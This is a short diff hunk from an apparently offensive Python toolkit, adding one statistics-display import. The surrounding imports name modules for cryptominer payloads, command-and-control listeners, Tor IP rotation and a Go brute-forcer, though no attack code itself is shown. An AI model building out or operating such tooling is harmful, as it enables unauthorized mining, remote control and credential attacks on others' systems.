@@ -38,6 +38,7 @@ from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
 from modules.command_control import start_listener, c2_interface, start_apache_server, stop_listeners
 from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
 from modules.go_bruteforce import run_golang_bruteforce
+from modules.stats_handler import display_statistics
 
 import os
 import keyboard
